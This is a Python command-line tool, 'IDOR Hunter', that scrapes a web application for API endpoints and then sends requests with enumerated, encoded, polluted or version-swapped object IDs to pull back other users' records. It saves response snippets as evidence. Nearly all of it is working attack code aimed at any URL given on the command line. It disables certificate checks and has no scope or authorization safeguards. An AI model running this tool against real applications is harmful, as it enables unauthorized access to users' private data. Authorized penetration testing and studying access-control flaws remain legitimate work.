#!/usr/bin/env python3
"""
IDOR Hunter v1.0 - Insecure Direct Object Reference & Broken Access Control Tester
Finds and exploits IDOR vulnerabilities in Next.js applications

Techniques:
1. ID Parameter Discovery - Finds all ID-like parameters
2. ID Enumeration - Tests sequential, UUID, hash-based IDs
3. Horizontal Privilege Escalation - Access other users' data
4. Vertical Privilege Escalation - Access admin resources
5. Parameter Pollution - Duplicate ID parameters
6. ID Encoding Bypass - Base64, hex, URL encoding
7. Reference Manipulation - Change object references
8. GraphQL IDOR - Object ID manipulation in GraphQL
9. API Versioning Bypass - Try older API versions
10. Timestamp/Predictable ID - Guess IDs based on patterns

Author: Security Research Team
"""

import requests
import re
import json
import sys
import os
import uuid
import hashlib
import base64
import random
import string
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, quote
from collections import defaultdict
from datetime import datetime, timedelta
from typing import Dict, List, Set, Tuple, Optional, Any
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
import urllib3
urllib3.disable_warnings()


class Colors:
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    PURPLE = "\033[95m"
    CYAN = "\033[96m"
    BOLD = "\033[1m"
    END = "\033[0m"


@dataclass
class IDORFinding:
    severity: str
    title: str
    endpoint: str
    parameter: str
    original_id: str
    manipulated_id: str
    technique: str
    evidence: str
    impact: str
    confidence: str


class IDORHunter:
    """
    Comprehensive IDOR and Broken Access Control Tester
    """

    def __init__(self, target: str, auth_token: str = None, auth_header: str = "Authorization",
                 user_id: str = None, output_dir: str = ".", verbose: bool = False):
        self.target = target.rstrip('/')
        self.auth_token = auth_token
        self.auth_header = auth_header
        self.user_id = user_id  # Current user's ID for comparison
        self.output_dir = output_dir
        self.verbose = verbose

        self.session = requests.Session()
        self.session.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json, text/html, */*',
            'Content-Type': 'application/json',
        }
        if auth_token:
            self.session.headers[auth_header] = auth_token
        self.session.verify = False

        # Discovered data
        self.endpoints: List[Dict] = []
        self.id_parameters: Dict[str, List[str]] = defaultdict(list)
        self.findings: List[IDORFinding] = []

        # ID patterns
        self.id_patterns = {
            'numeric': r'^\d+$',
            'uuid': r'^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$',
            'uuid_no_dash': r'^[0-9a-f]{32}$',
            'mongo_id': r'^[0-9a-f]{24}$',
            'base64': r'^[A-Za-z0-9+/]+=*$',
            'hex': r'^[0-9a-f]+$',
            'hash_md5': r'^[0-9a-f]{32}$',
            'hash_sha1': r'^[0-9a-f]{40}$',
            'hash_sha256': r'^[0-9a-f]{64}$',
            'alphanumeric': r'^[a-zA-Z0-9]+$',
            'slug': r'^[a-z0-9-]+$',
        }

        # Common ID parameter names
        self.id_param_names = [
            'id', 'ID', 'Id', 'user_id', 'userId', 'user', 'uid', 'account_id', 'accountId',
            'profile_id', 'profileId', 'member_id', 'memberId', 'customer_id', 'customerId',
            'order_id', 'orderId', 'invoice_id', 'invoiceId', 'transaction_id', 'transactionId',
            'post_id', 'postId', 'article_id', 'articleId', 'comment_id', 'commentId',
            'file_id', 'fileId', 'document_id', 'documentId', 'doc_id', 'docId',
            'project_id', 'projectId', 'org_id', 'orgId', 'team_id', 'teamId',
            'workspace_id', 'workspaceId', 'tenant_id', 'tenantId', 'company_id', 'companyId',
            'ref', 'reference', 'guid', 'uuid', 'key', 'token', 'slug', 'handle',
            'oid', 'pid', 'cid', 'aid', 'rid', 'sid', 'tid', 'vid', 'wid',
        ]

    def log(self, level: str, msg: str):
        colors = {
            'info': Colors.BLUE,
            'success': Colors.GREEN,
            'warning': Colors.YELLOW,
            'error': Colors.RED,
            'finding': Colors.PURPLE,
            'critical': Colors.RED + Colors.BOLD,
        }
        color = colors.get(level, '')
        print(f"{color}[{level.upper()}]{Colors.END} {msg}")

    def add_finding(self, severity: str, title: str, endpoint: str, parameter: str,
                    original_id: str, manipulated_id: str, technique: str,
                    evidence: str, impact: str, confidence: str = "medium"):
        finding = IDORFinding(
            severity=severity,
            title=title,
            endpoint=endpoint,
            parameter=parameter,
            original_id=original_id,
            manipulated_id=manipulated_id,
            technique=technique,
            evidence=evidence[:500],
            impact=impact,
            confidence=confidence
        )
        self.findings.append(finding)
        self.log('finding', f"[{severity}] {title} - {endpoint}")

    def run(self):
        """Run IDOR hunting"""
        print(f"\n{Colors.BOLD}{'='*60}{Colors.END}")
        print(f"{Colors.PURPLE}   IDOR HUNTER v1.0{Colors.END}")
        print(f"{Colors.BOLD}{'='*60}{Colors.END}")
        print(f"Target: {self.target}")
        print(f"Auth: {'Yes' if self.auth_token else 'No'}")
        print()

        # Phase 1: Discover endpoints with ID parameters
        print(f"\n{Colors.CYAN}[PHASE 1] ENDPOINT DISCOVERY{Colors.END}")
        self._discover_endpoints()

        # Phase 2: Identify ID parameters
        print(f"\n{Colors.CYAN}[PHASE 2] ID PARAMETER IDENTIFICATION{Colors.END}")
        self._identify_id_parameters()

        # Phase 3: Test numeric ID manipulation
        print(f"\n{Colors.CYAN}[PHASE 3] NUMERIC ID TESTING{Colors.END}")
        self._test_numeric_ids()

        # Phase 4: Test UUID manipulation
        print(f"\n{Colors.CYAN}[PHASE 4] UUID TESTING{Colors.END}")
        self._test_uuid_ids()

        # Phase 5: Test encoding bypass
        print(f"\n{Colors.CYAN}[PHASE 5] ENCODING BYPASS{Colors.END}")
        self._test_encoding_bypass()

        # Phase 6: Test parameter pollution
        print(f"\n{Colors.CYAN}[PHASE 6] PARAMETER POLLUTION{Colors.END}")
        self._test_parameter_pollution()

        # Phase 7: Test HTTP method override
        print(f"\n{Colors.CYAN}[PHASE 7] METHOD OVERRIDE{Colors.END}")
        self._test_method_override()

        # Phase 8: Test GraphQL IDOR
        print(f"\n{Colors.CYAN}[PHASE 8] GRAPHQL IDOR{Colors.END}")
        self._test_graphql_idor()

        # Phase 9: Test API versioning
        print(f"\n{Colors.CYAN}[PHASE 9] API VERSION BYPASS{Colors.END}")
        self._test_api_versioning()

        # Generate report
        self._generate_report()

    def _discover_endpoints(self):
        """Discover endpoints from the application"""
        self.log('info', 'Discovering endpoints...')

        # Get main page
        try:
            resp = self.session.get(self.target, timeout=30)
            html = resp.text

            # Find API endpoints in JavaScript
            api_patterns = [
                r'["\'](/api/[^"\']+)["\']',
                r'["\'](/v\d+/[^"\']+)["\']',
                r'fetch\s*\(\s*[`"\']([^`"\']+)[`"\']',
                r'axios\.\w+\s*\(\s*[`"\']([^`"\']+)[`"\']',
            ]

            endpoints = set()
            for pattern in api_patterns:
                for match in re.findall(pattern, html):
                    if match.startswith('/'):
                        endpoints.add(match)

            # Download and analyze JS files
            js_urls = re.findall(r'<script[^>]+src=["\']([^"\']+\.js)["\']', html)
            for js_url in js_urls[:10]:
                try:
                    full_url = urljoin(self.target, js_url)
                    resp = self.session.get(full_url, timeout=15)
                    for pattern in api_patterns:
                        for match in re.findall(pattern, resp.text):
                            if match.startswith('/'):
                                endpoints.add(match)
                except:
                    pass

            # Add common API endpoints
            common_endpoints = [
                '/api/user', '/api/users', '/api/me', '/api/profile',
                '/api/account', '/api/settings', '/api/orders',
                '/api/invoices', '/api/documents', '/api/files',
                '/api/projects', '/api/teams', '/api/workspaces',
            ]
            endpoints.update(common_endpoints)

            for ep in endpoints:
                self.endpoints.append({'path': ep, 'method': 'GET'})

            self.log('success', f'Discovered {len(self.endpoints)} endpoints')

        except Exception as e:
            self.log('error', f'Discovery failed: {e}')

    def _identify_id_parameters(self):
        """Identify ID parameters in endpoints"""
        self.log('info', 'Identifying ID parameters...')

        for endpoint in self.endpoints:
            path = endpoint['path']

            # Check path segments for IDs
            segments = path.split('/')
            for i, segment in enumerate(segments):
                # Check if segment matches ID patterns
                for id_type, pattern in self.id_patterns.items():
                    if re.match(pattern, segment, re.IGNORECASE):
                        self.id_parameters[path].append({
                            'type': 'path',
                            'position': i,
                            'value': segment,
                            'id_type': id_type
                        })
                        break

                # Check for dynamic route parameters [id], [slug], etc.
                if segment.startswith('[') and segment.endswith(']'):
                    param_name = segment[1:-1]
                    self.id_parameters[path].append({
                        'type': 'dynamic_route',
                        'position': i,
                        'param_name': param_name,
                        'value': None
                    })

            # Check query parameters
            if '?' in path:
                query = path.split('?')[1]
                params = parse_qs(query)
                for param, values in params.items():
                    if param.lower() in [p.lower() for p in self.id_param_names]:
                        self.id_parameters[path].append({
                            'type': 'query',
                            'param_name': param,
                            'value': values[0] if values else None
                        })

        self.log('success', f'Found ID parameters in {len(self.id_parameters)} endpoints')

    def _test_numeric_ids(self):
        """Test numeric ID manipulation"""
        self.log('info', 'Testing numeric ID manipulation...')

        for endpoint, params in self.id_parameters.items():
            for param in params:
                if param.get('id_type') == 'numeric' or param.get('type') == 'dynamic_route':
                    original_value = param.get('value', '1')
                    if not original_value or not original_value.isdigit():
                        original_value = '1'

                    original_int = int(original_value)

                    # Test cases for numeric IDs
                    test_ids = [
                        original_int - 1,  # Previous ID
                        original_int + 1,  # Next ID
                        1,  # First ID (often admin)
                        0,  # Zero
                        -1,  # Negative
                        original_int + 1000,  # Large offset
                        999999999,  # Very large
                    ]

                    for test_id in test_ids:
                        result = self._test_id_access(endpoint, param, str(original_value), str(test_id))
                        if result:
                            self.add_finding(
                                severity='HIGH',
                                title='Numeric IDOR Vulnerability',
                                endpoint=endpoint,
                                parameter=str(param),
                                original_id=str(original_value),
                                manipulated_id=str(test_id),
                                technique='numeric_enumeration',
                                evidence=result,
                                impact='Access to other users\' data',
                                confidence='high'
                            )
                            break  # One finding per endpoint

    def _test_uuid_ids(self):
        """Test UUID manipulation"""
        self.log('info', 'Testing UUID manipulation...')

        for endpoint, params in self.id_parameters.items():
            for param in params:
                if param.get('id_type') in ['uuid', 'uuid_no_dash', 'mongo_id']:
                    original = param.get('value', '')
                    if not original:
                        continue

                    # Generate test UUIDs
                    test_uuids = [
                        str(uuid.uuid4()),  # Random UUID
                        '00000000-0000-0000-0000-000000000000',  # Null UUID
                        '11111111-1111-1111-1111-111111111111',  # Pattern UUID
                        original[:-1] + ('0' if original[-1] != '0' else '1'),  # Off by one
                    ]

                    # For MongoDB ObjectIDs
                    if param.get('id_type') == 'mongo_id':
                        test_uuids.extend([
                            '000000000000000000000000',
                            '111111111111111111111111',
                            original[:-1] + ('0' if original[-1] != '0' else '1'),
                        ])

                    for test_uuid in test_uuids:
                        result = self._test_id_access(endpoint, param, original, test_uuid)
                        if result:
                            self.add_finding(
                                severity='HIGH',
                                title='UUID IDOR Vulnerability',
                                endpoint=endpoint,
                                parameter=str(param),
                                original_id=original,
                                manipulated_id=test_uuid,
                                technique='uuid_manipulation',
                                evidence=result,
                                impact='Access to other users\' data via UUID',
                                confidence='medium'
                            )
                            break

    def _test_encoding_bypass(self):
        """Test encoding bypass techniques"""
        self.log('info', 'Testing encoding bypass...')

        for endpoint, params in self.id_parameters.items():
            for param in params:
                original = param.get('value', '1')
                if not original:
                    continue

                # Different encodings
                encodings = {
                    'base64': base64.b64encode(original.encode()).decode(),
                    'double_base64': base64.b64encode(base64.b64encode(original.encode())).decode(),
                    'hex': original.encode().hex(),
                    'url_encode': quote(original),
                    'double_url': quote(quote(original)),
                    'unicode': ''.join(f'\\u{ord(c):04x}' for c in original),
                }

                # Test manipulated IDs with encoding
                test_id = str(int(original) + 1) if original.isdigit() else 'admin'

                for enc_name, enc_func in [
                    ('base64', lambda x: base64.b64encode(x.encode()).decode()),
                    ('hex', lambda x: x.encode().hex()),
                    ('url', lambda x: quote(x)),
                ]:
                    encoded_test = enc_func(test_id)
                    result = self._test_id_access(endpoint, param, original, encoded_test)
                    if result:
                        self.add_finding(
                            severity='HIGH',
                            title=f'IDOR via {enc_name.upper()} Encoding Bypass',
                            endpoint=endpoint,
                            parameter=str(param),
                            original_id=original,
                            manipulated_id=encoded_test,
                            technique=f'{enc_name}_encoding',
                            evidence=result,
                            impact='Encoding bypass allows IDOR',
                            confidence='high'
                        )

    def _test_parameter_pollution(self):
        """Test HTTP Parameter Pollution"""
        self.log('info', 'Testing parameter pollution...')

        for endpoint, params in self.id_parameters.items():
            for param in params:
                if param.get('type') != 'query':
                    continue

                param_name = param.get('param_name', 'id')
                original = param.get('value', '1')

                # HPP techniques
                hpp_payloads = [
                    f'{param_name}={original}&{param_name}=2',  # Duplicate param
                    f'{param_name}[]={original}&{param_name}[]=2',  # Array notation
                    f'{param_name}=2&{param_name}={original}',  # Reversed order
                    f'{param_name}={original},{2}',  # Comma separated
                ]

                base_path = endpoint.split('?')[0]
                for payload in hpp_payloads:
                    try:
                        url = f"{self.target}{base_path}?{payload}"
                        resp = self.session.get(url, timeout=10)
                        if resp.status_code == 200 and len(resp.text) > 50:
                            # Check if we got different data
                            orig_resp = self.session.get(f"{self.target}{base_path}?{param_name}={original}", timeout=10)
                            if resp.text != orig_resp.text:
                                self.add_finding(
                                    severity='MEDIUM',
                                    title='HTTP Parameter Pollution',
                                    endpoint=endpoint,
                                    parameter=param_name,
                                    original_id=original,
                                    manipulated_id=payload,
                                    technique='hpp',
                                    evidence=resp.text[:200],
                                    impact='Parameter pollution may bypass access controls',
                                    confidence='medium'
                                )
                                break
                    except:
                        pass

    def _test_method_override(self):
        """Test HTTP method override for access control bypass"""
        self.log('info', 'Testing method override...')

        override_headers = [
            ('X-HTTP-Method-Override', 'GET'),
            ('X-HTTP-Method', 'GET'),
            ('X-Method-Override', 'GET'),
            ('_method', 'GET'),
        ]

        for endpoint, params in list(self.id_parameters.items())[:5]:
            path = endpoint.split('?')[0]
            url = f"{self.target}{path}"

            # Try POST with method override to GET
            for header_name, header_value in override_headers:
                try:
                    headers = {header_name: header_value}
                    resp = self.session.post(url, headers=headers, timeout=10)

                    if resp.status_code == 200:
                        # Compare with actual GET
                        get_resp = self.session.get(url, timeout=10)
                        if resp.text == get_resp.text and len(resp.text) > 50:
                            self.add_finding(
                                severity='MEDIUM',
                                title='HTTP Method Override Accepted',
                                endpoint=endpoint,
                                parameter=header_name,
                                original_id='POST',
                                manipulated_id='GET',
                                technique='method_override',
                                evidence=f'{header_name}: {header_value}',
                                impact='Method override may bypass access controls',
                                confidence='medium'
                            )
                            break
                except:
                    pass

    def _test_graphql_idor(self):
        """Test GraphQL IDOR vulnerabilities"""
        self.log('info', 'Testing GraphQL IDOR...')

        graphql_endpoints = ['/api/graphql', '/graphql', '/api/v1/graphql']

        for gql_path in graphql_endpoints:
            url = f"{self.target}{gql_path}"

            # Common queries with ID parameters
            test_queries = [
                # User query
                {
                    'query': 'query { user(id: "1") { id email name } }',
                    'test_id': '2'
                },
                # Users with filter
                {
                    'query': 'query { users(where: {id: "1"}) { id email } }',
                    'test_id': '2'
                },
                # Node interface
                {
                    'query': 'query { node(id: "VXNlcjox") { ... on User { id email } } }',
                    'test_id': 'VXNlcjoy'
                },
            ]

            for test in test_queries:
                try:
                    # Original query
                    resp1 = self.session.post(url, json={'query': test['query']}, timeout=10)
                    if resp1.status_code != 200:
                        continue

                    # Modified query
                    modified_query = test['query'].replace('"1"', f'"{test["test_id"]}"')
                    modified_query = modified_query.replace('VXNlcjox', test['test_id'])
                    resp2 = self.session.post(url, json={'query': modified_query}, timeout=10)

                    if resp2.status_code == 200:
                        data1 = resp1.json()
                        data2 = resp2.json()

                        # Check if we got different data (not error)
                        if 'data' in data2 and data2['data'] and data1 != data2:
                            if 'errors' not in data2:
                                self.add_finding(
                                    severity='HIGH',
                                    title='GraphQL IDOR Vulnerability',
                                    endpoint=gql_path,
                                    parameter='id',
                                    original_id='1',
                                    manipulated_id=test['test_id'],
                                    technique='graphql_idor',
                                    evidence=str(data2)[:300],
                                    impact='GraphQL allows accessing other users\' data',
                                    confidence='high'
                                )
                                break
                except:
                    pass

    def _test_api_versioning(self):
        """Test API version bypass"""
        self.log('info', 'Testing API versioning bypass...')

        for endpoint, params in list(self.id_parameters.items())[:10]:
            path = endpoint.split('?')[0]

            # Try different API versions
            version_patterns = [
                (r'/api/v(\d+)/', '/api/v{}/'),
                (r'/v(\d+)/', '/v{}/'),
            ]

            for pattern, replacement in version_patterns:
                match = re.search(pattern, path)
                if match:
                    current_version = int(match.group(1))
                    test_versions = [current_version - 1, current_version + 1, 1, 2, 3]

                    for test_ver in test_versions:
                        if test_ver == current_version or test_ver < 1:
                            continue

                        new_path = re.sub(pattern, replacement.format(test_ver), path)
                        try:
                            url = f"{self.target}{new_path}"
                            resp = self.session.get(url, timeout=10)

                            if resp.status_code == 200:
                                self.add_finding(
                                    severity='MEDIUM',
                                    title='API Version Bypass',
                                    endpoint=path,
                                    parameter='api_version',
                                    original_id=f'v{current_version}',
                                    manipulated_id=f'v{test_ver}',
                                    technique='version_bypass',
                                    evidence=f'{new_path} returned 200',
                                    impact='Older API version may have weaker access controls',
                                    confidence='medium'
                                )
                                break
                        except:
                            pass

    def _test_id_access(self, endpoint: str, param: Dict, original_id: str, test_id: str) -> Optional[str]:
        """Test if we can access data with manipulated ID"""
        try:
            path = endpoint.split('?')[0]

            if param.get('type') == 'path':
                # Replace path segment
                segments = path.split('/')
                segments[param['position']] = test_id
                new_path = '/'.join(segments)
            elif param.get('type') == 'query':
                param_name = param.get('param_name', 'id')
                new_path = f"{path}?{param_name}={test_id}"
            else:
                return None

            url = f"{self.target}{new_path}"

            # Make request
            resp = self.session.get(url, timeout=10)

            # Check for success indicators
            if resp.status_code == 200:
                # Check if response contains data (not empty or error)
                if len(resp.text) > 50:
                    try:
                        data = resp.json()
                        # Check for actual data
                        if data and not data.get('error') and not data.get('message', '').lower().startswith('not found'):
                            return resp.text[:300]
                    except:
                        # Not JSON, check HTML
                        if 'error' not in resp.text.lower() and 'not found' not in resp.text.lower():
                            return resp.text[:300]

        except Exception as e:
            if self.verbose:
                self.log('warning', f'Test failed: {e}')

        return None

    def _generate_report(self):
        """Generate IDOR hunting report"""
        print(f"\n{Colors.BOLD}{'='*60}{Colors.END}")
        print(f"{Colors.PURPLE}   IDOR HUNTING RESULTS{Colors.END}")
        print(f"{Colors.BOLD}{'='*60}{Colors.END}")

        if not self.findings:
            print(f"\n{Colors.GREEN}No IDOR vulnerabilities found.{Colors.END}")
        else:
            # Group by severity
            by_severity = defaultdict(list)
            for f in self.findings:
                by_severity[f.severity].append(f)

            print(f"\n{Colors.CYAN}Findings Summary:{Colors.END}")
            for sev in ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW']:
                if by_severity[sev]:
                    color = {'CRITICAL': Colors.RED + Colors.BOLD, 'HIGH': Colors.RED,
                             'MEDIUM': Colors.YELLOW, 'LOW': Colors.CYAN}.get(sev, '')
                    print(f"  {color}{sev}: {len(by_severity[sev])}{Colors.END}")

            print(f"\n{Colors.CYAN}Detailed Findings:{Colors.END}")
            for finding in self.findings:
                print(f"\n  {Colors.YELLOW}[{finding.severity}] {finding.title}{Colors.END}")
                print(f"    Endpoint: {finding.endpoint}")
                print(f"    Parameter: {finding.parameter}")
                print(f"    Original ID: {finding.original_id}")
                print(f"    Manipulated ID: {finding.manipulated_id}")
                print(f"    Technique: {finding.technique}")
                print(f"    Impact: {finding.impact}")

        # Save report
        report = {
            'target': self.target,
            'timestamp': datetime.now().isoformat(),
            'total_endpoints': len(self.endpoints),
            'endpoints_with_ids': len(self.id_parameters),
            'findings': [
                {
                    'severity': f.severity,
                    'title': f.title,
                    'endpoint': f.endpoint,
                    'parameter': f.parameter,
                    'original_id': f.original_id,
                    'manipulated_id': f.manipulated_id,
                    'technique': f.technique,
                    'evidence': f.evidence,
                    'impact': f.impact,
                    'confidence': f.confidence,
                }
                for f in self.findings
            ]
        }

        report_dir = os.path.join(self.output_dir, 'idor_results')
        os.makedirs(report_dir, exist_ok=True)

        report_file = os.path.join(report_dir, 'idor_report.json')
        with open(report_file, 'w') as f:
            json.dump(report, f, indent=2)

        print(f"\n{Colors.GREEN}Report saved: {report_file}{Colors.END}")


def main():
    if len(sys.argv) < 2:
        print("Usage: python idor_hunter.py <target_url> [options]")
        print("Options:")
        print("  --auth <token>     Authentication token")
        print("  --header <name>    Auth header name (default: Authorization)")
        print("  --user-id <id>     Current user's ID for comparison")
        print("  -v, --verbose      Verbose output")
        print("\nExample:")
        print("  python idor_hunter.py https://example.com --auth 'Bearer token123'")
        sys.exit(1)

    target = sys.argv[1]
    auth_token = None
    auth_header = "Authorization"
    user_id = None
    verbose = False

    # Parse arguments
    i = 2
    while i < len(sys.argv):
        if sys.argv[i] == '--auth' and i + 1 < len(sys.argv):
            auth_token = sys.argv[i + 1]
            i += 2
        elif sys.argv[i] == '--header' and i + 1 < len(sys.argv):
            auth_header = sys.argv[i + 1]
            i += 2
        elif sys.argv[i] == '--user-id' and i + 1 < len(sys.argv):
            user_id = sys.argv[i + 1]
            i += 2
        elif sys.argv[i] in ['-v', '--verbose']:
            verbose = True
            i += 1
        else:
            i += 1

    hunter = IDORHunter(target, auth_token=auth_token, auth_header=auth_header,
                        user_id=user_id, verbose=verbose)
    hunter.run()


if __name__ == "__main__":
    main()
